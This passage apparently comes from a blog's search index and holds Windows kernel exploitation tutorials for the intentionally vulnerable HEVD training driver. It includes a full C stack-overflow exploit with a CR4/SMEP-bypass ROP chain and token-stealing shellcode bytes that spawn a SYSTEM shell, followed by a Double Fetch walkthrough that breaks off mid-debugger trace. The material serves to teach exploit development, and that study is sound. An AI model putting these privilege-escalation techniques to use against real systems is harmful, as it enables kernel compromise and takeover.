<pre><code>0: kd&gt; bp HEVD!TriggerBufferOverflowStack+0xca\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!TriggerBufferOverflowStack+0xca:\nfffff80e`06fb667e e83dabf7ff      call    HEVD!memcpy (fffff80e`06f311c0)\n\n1: kd&gt; pt\nHEVD!TriggerBufferOverflowStack+0x10b:\nfffff80e`06fb66bf c3              ret\n\n1: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 ffff8e81`165f67b8 42424242`42424242     HEVD!TriggerBufferOverflowStack+0x10b\n01 ffff8e81`165f67c0 00000000`00000003     0x42424242`42424242\n</code></pre> <p>Perfect we now have control of the return address. However, we've not won yet. We have some exploit mitigations which need to be taken into consideration.</p> <p>The first mitigation we need to circumvent is Supervisor Mode Execution Prevention (SMEP), this is a hardware mitigation that restricts code that resides in user-mode from being executed in ring0. In essence this prevents EoPs that rely on executing a user-mode payload.</p>","title":"Gaining Control of the Return Address"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#smep-bypass","tags":["windows-kernel-exploitation"],"text":"<p>There's a few ways we can bypass SMEP but the main one (and the one we're going to use) is to construct a ROP chain that reads the content of CR4 and then flips the 20th bit of the register - upon doing so SMEP will be disabled and we can simply jump to our user-mode payload. </p>  Attention <p>In this example we are going to use APIs that are only available to medium (or higher) intgreity levels. Namely, <code>EnumDeviceDrivers</code>. In a lot of EoP cases we will be at low level integrity, not medium in these cases you'll need a leak to get the base address of kernel modules. 1</p>  <p>First we'll create a new function in our C code called <code>GetKernelBase</code> this function itself is fairly simple, all it will do is make a call to <code>EnumDeviceDrivers</code> and then get the first item from the returned array the first item will be the base address for <code>ntoskrnl.exe</code>. The below code only includes changes.</p> <pre><code>#include &lt;Psapi.h&gt;\n\nunsigned long long GetKernelBase(void)\n{\n\n    LPVOID  lpImageBase[1024];\n    DWORD   lpcbNeeded;\n\n    /* Get base address of first driver (ntoskrnl.exe) */\n    printf(\"[+] Obtaining Driver Base Address!\\n\");\n    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &amp;lpcbNeeded);\n    if (!DriversBase)\n    {\n        printf(\"[!] FATAL: Error enumerating device drivers!\\n\");\n        exit(1);\n    }\n\n    /* Get name of first driver (ntoskrnl.exe) */\n    char BaseName[1024] = {0};\n    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));\n    if (!DriversBaseName)\n    {\n        printf(\"[!] FATAL: Error getting drivers base name!\\n\");\n        exit(1);\n    }\n\n    /* \n     * ntoskrnl.exe is the first module in lpImageBase.\n     * typecast LPVOID -&gt; unsigned long long\n    */\n    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];\n\n    printf(\"[*] Driver base name is: %s\", BaseName);\n    printf(\"[*] %s is located at: 0x%x\\n\", BaseName, KernelBase);\n\n    return KernelBase;\n\n}\n</code></pre> <p>As you can see it is very easy to get the base address of the kernel and other drivers providing that you have access to the <code>EnumDeviceDrivers</code> call. But, we're not done here. We still need to build our ROP chain to flip the 20th bit of the CR4 register.</p> <p>The ROP chain itself is fairly simple, we simply need to pop our inteded CR4 value into a register and then move the contents of that register into the CR4 register thus turning off SMEP. To find gadgets we can use something such as RP++. In my case I found the below gadgets in <code>ntoskrnl.exe</code>.</p> Gadgets for SMEP bypass<pre><code>0x1406a0a51: pop rcx ; ret     \n0x1409a41e3: mov cr4, rcx ; ret\n</code></pre> <p>Now that we've got the gadgets to use we need to update our exploit to place those gadgets in the buffer at the point we control the return address so that when we return we start our ROP chain to disable SMEP.</p> Updated code to include SMEP bypass<pre><code>    char buffer[2100] = {0};\n\n    unsigned long long BaseAddress = GetKernelBase();\n\n    unsigned long long ROP1 = BaseAddress + 0x6a0a51;   // 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe\n    unsigned long long ROP2 = 0x70678;                  // Updated CR4\n    unsigned long long ROP3 = BaseAddress + 0x9a41e3;   // 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe\n\n    /* Fill exploit buffer with As. */\n    memset(buffer, 0x41, sizeof(buffer));\n\n    printf(\"[+] Beginning ROP chain to disable SMEP!\\n\");\n    memcpy(&amp;buffer[2072], &amp;ROP1, GadgetSize);\n    memcpy(&amp;buffer[2072+8], &amp;ROP2, GadgetSize);\n    memcpy(&amp;buffer[2072+16], &amp;ROP3, GadgetSize);\n    printf(\"[*] SMEP should now be disabled!\\n\");\n</code></pre> <p>If you're wondering why we choose the value <code>0x70678</code> to be the new value for CR4 this is because in binary this value is <code>1110000011001111000</code> which makes the 20th bit 0, which is the bit for SMEP. Let's go ahead and trace the execution in a debugger and ensure that the 20th bit of CR4 is getting correctly set to 0 to disable SMEP.</p> Bypassing SMEP<pre><code>0: kd&gt; bp HEVD!TriggerBufferOverflowStack+0xca\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!TriggerBufferOverflowStack+0xca:\nfffff805`87e8667e e83dabf7ff      call    HEVD!memcpy (fffff805`87e011c0)\n\n1: kd&gt; p\nHEVD!TriggerBufferOverflowStack+0xcf:\nfffff805`87e86683 eb1b            jmp     HEVD!TriggerBufferOverflowStack+0xec (fffff805`87e866a0)\n\n[...] /* (2) */\n\n1: kd&gt; p\nHEVD!TriggerBufferOverflowStack+0x10b:\nfffff805`87e866bf c3              ret\n\n1: kd&gt; p\nnt!HvCheckBin+0xe1:\nfffff805`820a0a51 59              pop     rcx\n\n1: kd&gt; p\nnt!HvCheckBin+0xe2:\nfffff805`820a0a52 c3              ret\n\n1: kd&gt; r\nrax=0000000000000000 rbx=0000000000070678 rcx=0000000000070678 /* (1) */\nrdx=0000467ddeabe610 rsi=fffff805823a41e3 rdi=0000000041414141\nrip=fffff805820a0a52 rsp=ffffb98221b417a8 rbp=ffffe58cd6bfdcd0\n r8=0000000000000000  r9=0000000000000000 r10=fffff80587e85078\nr11=ffffb98221b41780 r12=4141414141414141 r13=0000000000000000\nr14=4141414141414141 r15=4141414141414141\niopl=0         nv up ei pl zr na po nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\n\nnt!HvCheckBin+0xe2:\nfffff805`820a0a52 c3              ret\n\n1: kd&gt; p\nnt!KiEnableXSave+0xb53f:\nfffff805`823a41e3 0f22e1          mov     tmm,rcx\n\n1: kd&gt; p\nnt!KiEnableXSave+0xb542:\nfffff805`823a41e6 c3              ret\n\n1: kd&gt; r cr4\ncr4=0000000000070678\n</code></pre> <ol> <li>Pay attention to the value in RCX here.</li> <li>This denotes excluded instructions. It isn't important.</li> </ol> <p>As you can see in the above output from WinDbg we set a breakpoint on the memcpy then we step through the program until the return, at the return we can clearly see that our <code>pop rcx</code> gadget is executed and then the value <code>70678</code> is placed in the RCX register. If we continue stepping we then see that value being written into the CR4 register thus allowing us to bypass SMEP. All that's left for us to do now is to allocate some space in user land, fill it with shellcode and get a system shell.</p> <p>I'll leave this part for you to do based on whatever build of Windows you're on. I'm on RS1 in this post so I used a well known shellcode (got it from here thanks Conor ) which loops over processes and does a comparison between the current PID vs the SYSTEM PID until the SYSTEM PID is found. </p>","title":"SMEP Bypass"},{"location":"Posts/2022/2022-05-14-HEVD3-StackOverflow/#final-exploit","tags":["windows-kernel-exploitation"],"text":"<p>You can find my full exploit below. Or scroll down to open it on GitHub. Thanks for reading!</p> Final Exploit<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Psapi.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x222003\n\nunsigned long long GetKernelBase(void)\n{\n\n    LPVOID  lpImageBase[1024];\n    DWORD   lpcbNeeded;\n\n    /* Get base address of first driver (ntoskrnl.exe) */\n    printf(\"[+] Obtaining Driver Base Address!\\n\");\n    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &amp;lpcbNeeded);\n    if (!DriversBase)\n    {\n        printf(\"[!] FATAL: Error enumerating device drivers!\\n\");\n        exit(1);\n    }\n\n    /* Get name of first driver (ntoskrnl.exe) */\n    char BaseName[1024] = {0};\n    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));\n    if (!DriversBaseName)\n    {\n        printf(\"[!] FATAL: Error getting drivers base name!\\n\");\n        exit(1);\n    }\n\n    /* \n     * ntoskrnl.exe is the first module in lpImageBase.\n     * typecast LPVOID -&gt; unsigned long long\n    */\n    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];\n\n    printf(\"[*] Driver base name is: %s\\n\", BaseName);\n    printf(\"[*] %s is located at: 0x%p\\n\", BaseName, KernelBase);\n\n    return KernelBase;\n\n}\n\nunsigned long long CreateShellcode(void)\n{\n    /*\n        _start:\n            mov rax, [gs:0x188]         ; Current thread (_KTHREAD)\n            mov rax, [rax + 0xb8]       ; Current process (_EPROCESS)\n            mov rbx, rax                ; Copy current process (_EPROCESS) to rbx\n        __loop:\n            mov rbx, [rbx + 0x2f0]      ; ActiveProcessLinks\n            sub rbx, 0x2f0              ; Go back to current process (_EPROCESS)\n            mov rcx, [rbx + 0x2e8]      ; UniqueProcessId (PID)\n            cmp rcx, 4                  ; Compare PID to SYSTEM PID \n            jnz __loop                  ; Loop until SYSTEM PID is found\n            mov rcx, [rbx + 0x358]      ; SYSTEM token is @ offset _EPROCESS + 0x358\n            and cl, 0xf0                ; Clear out _EX_FAST_REF RefCnt\n            mov [rax + 0x358], rcx      ; Copy SYSTEM token to current process\n            add rsp, 0x40               ; Restore execution\n            ret \n    */\n\n    // Windows 10 RS1 offsets in _EPROCESS structure\n    char payload[] = \"\\x65\\x48\\x8B\\x04\\x25\\x88\\x01\\x00\\x00\\x48\\x8B\\x80\"\n                     \"\\xB8\\x00\\x00\\x00\\x48\\x89\\xC3\\x48\\x8B\\x9B\\xF0\"\n                     \"\\x02\\x00\\x00\\x48\\x81\\xEB\\xF0\\x02\\x00\\x00\\x48\"\n                     \"\\x8B\\x8B\\xE8\\x02\\x00\\x00\\x48\\x83\\xF9\\x04\"\n                     \"\\x75\\xE5\\x48\\x8B\\x8B\\x58\\x03\\x00\\x00\\x80\"\n                     \"\\xE1\\xF0\\x48\\x89\\x88\\x58\\x03\\x00\\x00\\x48\"\n                     \"\\x83\\xC4\\x40\\xC3\";\n\n    /* Allocate shellcode in user mode */\n    LPVOID shellcode = VirtualAlloc(NULL, sizeof(payload), 0x3000, 0x40);\n    if (!shellcode)\n    {\n        printf(\"[-] FATAL: Unable to allocate shellcode!\\n\");\n        exit(1);\n    }\n    printf(\"[+] Shellcode allocated at: 0x%p\\n\", shellcode);\n\n    /* Move allocated space in user mode */\n    BOOL MoveMem = RtlMoveMemory(shellcode, payload, sizeof(payload));\n    if(!MoveMem)\n    {\n        printf(\"[-] FATAL: Unable to move shellcode into allocated memory!\\n\");\n    }\n\n    unsigned long long ShellcodeBase = (unsigned long long)shellcode;\n    return ShellcodeBase;\n}\n\nvoid exploit(void)\n{\n    HANDLE  DriverHandle;\n    DWORD   OldProtect;\n    char    buffer[2100] = {0};\n\n    unsigned long long BaseAddress = GetKernelBase();\n    unsigned long long shellcode = CreateShellcode();\n\n    unsigned long long ROP1 = BaseAddress + 0x6a0a51;   // 0x1406a0a51: pop rcx ; ret      : ntoskrnl.exe\n    unsigned long long ROP2 = 0x70678;                  // Updated CR4\n    unsigned long long ROP3 = BaseAddress + 0x9a41e3;   // 0x1409a41e3: mov cr4, rcx ; ret : ntoskrnl.exe\n\n    /* Fill exploit buffer with As. */\n    memset(buffer, 0x41, sizeof(buffer));\n\n    printf(\"[+] Beginning ROP chain to disable SMEP!\\n\");\n    memcpy(&amp;buffer[2072], &amp;ROP1, 8);\n    memcpy(&amp;buffer[2072+8], &amp;ROP2, 8);\n    memcpy(&amp;buffer[2072+16], &amp;ROP3, 8);\n    printf(\"[*] SMEP should now be disabled!\\n\");\n\n    memcpy(&amp;buffer[2072+24], &amp;shellcode, 8);\n    printf(\"[+] Executing shellcode!\\n\");\n\n    printf(\"[*] Opening handle to %s\\n\", DRIVER);\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE) \n    {\n        printf(\"[!] FATAL: Could not open HEVD handle!\\n\");\n        return;\n    }\n\n    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, buffer, sizeof(buffer), NULL, 0, NULL, NULL))\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Stack Buffer Overflow!\\n\");\n    exploit();\n\n    system(\"cmd.exe /c cmd.exe /K cd C:\\\\\");\n    printf(\"[*] 1337 System Shell Bozo\");\n\n    return 0;\n}\n</code></pre> <p>Exploit on  </p>   <ol> <li> <p>In the future I will publish an article which explains that process in more detail. However in this example we're just going to use <code>EnumDeviceDrivers</code>.\u00a0\u21a9</p> </li> </ol>","title":"Final Exploit"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/","tags":["windows-kernel-exploitation"],"text":"","title":"HackSys Extreme Vulnerable Driver 3 - Double Fetch"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#introduction","tags":["windows-kernel-exploitation"],"text":"<p>This post is part of a series on Hacksys Extreme Vulnerable Driver, if you have not read my previous post I would suggest reading it unless you're already familiar with kernel exploitation on Windows.</p> <p>In this post we will be exploring a Double Fetch vulnerability. - we assume that you already have an environment setup to follow along. However, if you don't have an environment setup in this post we use:</p> <ul> <li>Windows 10 Pro x64 RS1</li> <li>HEVD 3.00</li> </ul> <p>If you are not sure how to setup a kernel debugging environment you can find plenty of posts of the process online, we will not cover the process in this post.</p>","title":"Introduction"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#double-fetch","tags":["windows-kernel-exploitation"],"text":"<p>Before covering the vulnerability lets first talk a bit about what a Double Fetch bug actually is. In short a Double Fetch is a specific type of time-of-check to time-of-use bug. The general cause is when a process reads an untrusted variable more than once without re-verifying any checks of the variable on the second read. These bugs are very common in shared memory interfaces. I would highly recommend you read this research report by Nick Dunn from NCC Group.</p>","title":"Double Fetch"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#reversing-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>In this post we will assume that you have read the previous post in which we explore a simple stack buffer overflow in HEVD, if you have not read that post I'd recommend you read it as it is a nice introduction to driver exploitation on Windows.</p> <p>As noted in the previous post the IRP handler is located at <code>sub_140085078</code> however we will refer to this function as <code>IrpDeviceIoCtlHandler</code> going forward.</p>","title":"Reversing the Driver"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#locating-the-ioctl-handler","tags":["windows-kernel-exploitation"],"text":"<p>To find the vulnerable function we can simply do a string search for \"double fetch\" which should lead us to the vulnerable function.</p>","title":"Locating the IOCTL Handler"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#reversing-the-vulnerable-function","tags":["windows-kernel-exploitation"],"text":"<p>Now that we've located the vulnerable function we can begin reversing it and looking for the vulnerability.</p> Vulnerable Function<pre><code>char Dst[2048]; // kernel stack allocated buffer\n\nmemset(Dst, 0, sizeof(Dst));         \nProbeForRead(Address, 0x10, 1u);         // check user-mode buffer Address in user-mode and aligned\n\nDbgPrintEx(0x4Du, 3u, \"[+] UserDoubleFetch-&gt;Buffer: 0x%p\\n\", *(const void **)Address);  //  Address-&gt;Buffer\nDbgPrintEx(0x4Du, 3u, \"[+] UserDoubleFetch-&gt;Size: 0x%X\\n\", *((_QWORD *)Address + 1));   //  Address-&gt;Size\n\ncheck_size = *((_QWORD *)Address + 1);                                                  //  set v2 = Address-&gt;Size\nif ( check_size &lt;= 2048 ) {\n    DbgPrintEx(0x4Du, 3u, \"[+] Triggering Double Fetch\\n\");\n    RtlCopyMemory(Dst, *(const void **)Address, *((_QWORD *)Address + 1));\n\n    result = 0;\n}\n\nelse {\n    DbgPrintEx(0x4Du, 3u, \"[-] Invalid Buffer Size: 0x%X\\n\", CheckSize);\n    result = 3221225485;\n}\n\n  return result;\n}\n</code></pre> <p>Starting from the top of the above decompilation we can see that there's a stack allocated buffer <code>Dst</code> that is 2048 bytes, that buffer then gets zero'd out with memset. Following that a call to <code>ProbeForRead</code> verifies that out user-mode buffer is:</p> <ol> <li>Actually in user-mode</li> <li>Aligned correctly</li> </ol> <p>Moving down the function we have two <code>DbgPrintEx</code> calls which are there to assist us with reversing the vulnerabilities. These two print statements show us that the format of our user-mode buffer is actually a struct with the first member being the buffer itself and the second member being the size. The below code block is shown to help visualise the situation. Note this below code block is not from HEVD.</p> Example UserModeBuffer Structure<pre><code>UserModeBuffer {\n    char    Buffer\n    size_t  BufferSize\n}\n</code></pre> <p>If we keep moving down the function we can see that a local variable is assigned to the value of <code>Address+1</code> which we know is the size member of our structure based on the print statements before. That local variable is then checked against the size of the stack allocated buffer 2048 bytes.</p> <p>If the value of <code>Address+1</code> is less-than or equal to 2048 bytes then we will execute an <code>RtlCopyMemory</code> of our user-mode structure into the stack allocated buffer <code>Dst</code> with the size specified in <code>Address+1</code>. If however anything other than that size check is passed, we will fall into the else condition and receive an <code>Invalid Buffer Size</code> error and return an error code.</p> <p>At this point it should be pretty clear where the vulnerability is here. Let's re-examine the case of us passing the size check in more detail to fully understand the bug. I've cleaned up the decompilation slightly for ease of reading.</p> Size Check in Detail<pre><code>check_size = (UserBuffer-&gt;Size); // (1)\n\nif ( check_size &lt;= 2048 ) {\n    DbgPrintEx(0x4D, 3, \"[+] Triggering Double Fetch\\n\");\n    RtlCopyMemory(Dst, UserBuffer-&gt;Buffer, UserBuffer-&gt;Size); // (2)\n\n    result = 0;\n}\n</code></pre> <ol> <li><code>UserBuffer-&gt;Size</code> is fetched once here before the size check</li> <li><code>UserBuffer-&gt;Size</code> is then fetched again to use as the size in the copy, even though a local variable <code>check_size</code> has the size after the first fetch</li> </ol> <p>So we know that our input is in the form of a structure where the first member is our buffer and the second member is a size, we also know that before we can perform a copy from the user-mode buffer into the stack allocated buffer a size check is performed. If that size check is less-than or equal to 2048 (the size of <code>Dst</code>) then we'll perform the copy. </p> <p>However, there is a problem here in the copy. Notice how the <code>UserBuffer-&gt;Size</code> member is actually fetched twice. It is first fetched for the size check and then it is fetched again for the copy, here lies the vulnerability. Instead of using the <code>check_size</code> value in the copy, the code fetches our structure member again, this is wrong. The question becomes what if we can somehow pass this size check but then after we pass it give a bigger size than the size value that was used in order to pass the check?</p>","title":"Reversing the Vulnerable Function"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#dynamic-analysis","tags":["windows-kernel-exploitation"],"text":"<p>Now that we've performed static analysis of the suspected vulnerability it is time to start building a program to interact with the code and prove that our suspected vulnerability is in-fact exploitable.</p>","title":"Dynamic Analysis"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#interacting-with-the-driver","tags":["windows-kernel-exploitation"],"text":"<p>Similarly to the last post we're going to choose to use C in order to interact with the driver, I explained my reasoning for using C in the last post, I won't cover them again here. We also need to keep in mind that in order to exploit this vulnerability we're going to need two threads, if we do this in a single thread, we won't be able to exploit the vulnerability, and we'll show why shortly.</p> <p>To get us started we'll need to open a handle to the device, the below code block will do that. It is almost identical to the method we used in the previous post only this time it has its own function. If you're following along for yourself I would actually recommend that you create a separate source file with some utility functions in, and put this there since you're going to need to open a handle for everything anyways. I am simply including it for clarity.</p> Simple Driver Interaction<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x222037\n\nHANDLE OpenDriverHandle(void)\n{\n    HANDLE DriverHandle = NULL;\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE)\n    {\n        printf(\"[!] FATAL: Failed to open driver handle!\"\\n);\n        exit(-1);\n    }\n    else\n    {\n        printf(\"[+] Opened Driver Handle: 0x%x\", DriverHandle);\n        return DriverHandle;\n    }\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Double Fetch\\n\");\n\n    printf(\"[*] Opening handle to driver!\\n);\n    HANDLE DriverHandle = OpenDeviceHandle()\n}\n</code></pre> <p>Now that we've got a handle to the device we'll also need to issue a <code>DeviceIoControl</code> request in order to interact with the IOCTL for our Double Fetch function. The below code block is the additional code added in order to make that request. Bear in mind currently this is all single-threaded.</p> Beginnings of an exploit function<pre><code>typedef struct _USER_DOUBLE_FETCH\n{\n    LPVOID  Buffer;\n    SIZE_T  Size;\n} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;\n\nvoid exploit(DriverHandle)\n{\n\n    LPVOID  UserBuffer = {0};\n    SIZE_T  UserBufferSize = 2048;\n\n    /* Allocate USER_DOUBLE_FETCH struct */\n    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);\n    if(!PtrUserDoubleFetch)\n    {\n        printf(\"[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\\n\");\n        return;\n    }\n\n    /* Allocate USER_DOUBLE_FETCH members */\n    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);\n    if(!UserBuffer)\n    {\n        printf(\"[!] FATAL: Failed to allocate heap buffer!\\n\");\n        return;\n    }\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer  = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size    = UserBufferSize;\n\n    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, PtrUserDoubleFetch, PtrUserDoubleFetch-&gt;Size, NULL, 0, NULL, NULL))\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n\n}\n</code></pre> <p>In the above code block we first define a structure called <code>_USER_DOUBLE_FETCH</code> note the use of a typedef here, if you're unsure about the purpose of that then I'd recommend reading this answer and this answer on StackOverflow, in short, it makes our life easier. Inside our structure we've defined two members, the same members which are defined in the driver based on the <code>DbgPrint</code> statements we saw. The first is a pointer to a buffer and the second is a size value.</p> <p>In the next part of the code at the top of the <code>exploit()</code> function we allocate our created structure on the stack using a call to <code>VirtualAlloc</code>, then we check that the allocation was successful. One particularly important part of our call to <code>VirtualAlloc</code> is the use of <code>PAGE_NOCACHE</code> as the name suggests this sets the allocated pages to be non-cacheable, this is particularly important in regards to winning race conditions because a cached page could interfere with us winning the race. You can find more detail on that particularity in this fantastic paper published by Gynvael Coldwind from Google.</p> <p>Directly after we then perform a <code>HeapAlloc</code> for the <code>UserBuffer</code> and we use the <code>UserBufferSize</code> defined at the top of the <code>exploit()</code> function. Remember at this point we are not trying to exploit the vulnerability we are simply trying to verify we can successfully interact with it. Following the heap allocation we initialize the structure members with our defined <code>UserBuffer</code> and <code>UserBufferSize</code> values respectively.</p> <p>Finally we issue our <code>DeviceIoControl</code> request in order to interact with the vulnerable IOCTL. As you can see already, there is a significant amount of more work required here compared to the buffer overflow in the previous post. In the below code block you can see the finished result of everything we've just covered.</p>","title":"Interacting with the Driver"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#exploit-summary-0x1","tags":["windows-kernel-exploitation"],"text":"Exploit so Far<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x222037\n\ntypedef struct _USER_DOUBLE_FETCH\n{\n    LPVOID  Buffer;\n    SIZE_T  Size;\n} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;\n\nHANDLE OpenDriverHandle(void)\n{\n    HANDLE DriverHandle = NULL;\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE)\n    {\n        printf(\"[!] FATAL: Failed to open driver handle!\\n\");\n        exit(-1);\n    }\n    else\n    {\n        printf(\"[+] Opened Driver Handle: 0x%x\\n\", DriverHandle);\n        return DriverHandle;\n    }\n}\n\nvoid exploit(DriverHandle)\n{\n\n    LPVOID  UserBuffer = {0};\n    SIZE_T  UserBufferSize = 2048;\n\n    /* Allocate USER_DOUBLE_FETCH struct */\n    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);\n    if(!PtrUserDoubleFetch)\n    {\n        printf(\"[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\\n\");\n        return;\n    }\n\n    /* Allocate USER_DOUBLE_FETCH members */\n    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);\n    if(!UserBuffer)\n    {\n        printf(\"[!] FATAL: Failed to allocate heap buffer!\\n\");\n        return;\n    }\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer  = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size    = UserBufferSize;\n\n    if (!DeviceIoControl(DriverHandle, IOCTL_CODE, PtrUserDoubleFetch, PtrUserDoubleFetch-&gt;Size, NULL, 0, NULL, NULL))\n    {\n        printf(\"[!] FATAL: Error sending IOCTL to driver!\\n\");\n        return;\n    }\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Double Fetch\\n\");\n\n    printf(\"[*] Opening handle to driver!\\n\");\n    HANDLE DriverHandle = OpenDriverHandle();\n\n    printf(\"[*] Running exploit function!\\n\");\n    exploit(DriverHandle);\n}\n</code></pre> <p>At this point we want to verify that we can interact with the driver and specifically the correct IOCTL. We'll set a breakpoint in our debugger on <code>HEVD!TriggerDoubleFetch</code>. Then we'll run the POC so far and verify that we can interact with the vulnerable function.</p> <pre><code>0: kd&gt; bp HEVD!TriggerDoubleFetch\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!TriggerDoubleFetch:\nfffff805`b494681c 488bc4          mov     rax,rsp\n</code></pre> <p>Perfect. We can interact with the function. What we'll do now is take a look at the behaviour we mentioned earlier in regards to the size check followed by the copy. In order to do this we'll add a <code>memset()</code> to our POC and set the buffer struct member to be filled with 0x41s. Then we'll set a breakpoint on the function and verify that: </p> <ol> <li>our buffer is used </li> <li>that we can perform the copy from user-mode to kernel-mode as long as we don't violate the size check.</li> </ol> Checking our input<pre><code>0: kd&gt; bp HEVD!TriggerDoubleFetch+0x41\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!TriggerDoubleFetch:\nfffff805`b494681c 488bc4          mov     rax,rsp\n\n1: kd&gt; g\nBreakpoint 1 hit\nHEVD!TriggerDoubleFetch+0x41:\nfffff805`b494685d ff15e5b7f7ff    call    qword ptr [HEVD!_imp_ProbeForRead (fffff805`b48c2048)]\n\n1: kd&gt; p\nHEVD!TriggerDoubleFetch+0x47:\nfffff805`b4946863 4c8bcf          mov     r9,rdi\n\n1: kd&gt; dq rdi // (1)\n0000018c`389b0000  0000018c`38a252b0 00000000`00000800\n0000018c`389b0010  00000000`00000000 00000000`00000000\n0000018c`389b0020  00000000`00000000 00000000`00000000\n0000018c`389b0030  00000000`00000000 00000000`00000000\n0000018c`389b0040  00000000`00000000 00000000`00000000\n0000018c`389b0050  00000000`00000000 00000000`00000000\n0000018c`389b0060  00000000`00000000 00000000`00000000\n0000018c`389b0070  00000000`00000000 00000000`00000000\n\n1: kd&gt; dq 0000018c`38a252b0\n0000018c`38a252b0  41414141`41414141 41414141`41414141\n0000018c`38a252c0  41414141`41414141 41414141`41414141\n0000018c`38a252d0  41414141`41414141 41414141`41414141\n0000018c`38a252e0  41414141`41414141 41414141`41414141\n0000018c`38a252f0  41414141`41414141 41414141`41414141\n0000018c`38a25300  41414141`41414141 41414141`41414141\n0000018c`38a25310  41414141`41414141 41414141`41414141\n0000018c`38a25320  41414141`41414141 41414141`41414141\n\n1: kd&gt; ? 800\nEvaluate expression: 2048 = 00000000`00000800\n</code></pre> <ol> <li>RDI has the address <code>0000018c38a252b0</code> which is a pointer to our buffer.</li> </ol> <p>Great, we can verify that our buffer is stored in a pointer that is in the RDI register. We can also see that the decimal value 800 is in RDI also, converting 800 to hex we get the value 2048 which is our size. Now we'll continue stepping through the function and ensure that we pass the size check and as a result perform the copy.</p> Passing the size check<pre><code>1: kd&gt; r\nrax=0000000000000000 rbx=0000000000000000 rcx=000000000000004d\nrdx=0000000000000003 rsi=0000000000000003 rdi=0000018c389b0000\nrip=fffff805b49468df rsp=ffffb40015e3df90 rbp=ffff8f886e5c87c0\n r8=000000000000004d  r9=0000000000000800 // (2) r10=0000000000000000\nr11=ffffb40015e3df88 r12=0000000000000000 r13=ffff8f886d97c6b0\nr14=000000000000004d r15=0000000000000800 // (1)\niopl=0         nv up ei ng nz na po nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286\n\nHEVD!TriggerDoubleFetch+0xc3:\nfffff805`b49468df 4d3bcf          cmp     r9,r15\n\n1: kd&gt; p\nHEVD!TriggerDoubleFetch+0xc6:\nfffff805`b49468e2 7614            jbe     HEVD!TriggerDoubleFetch+0xdc 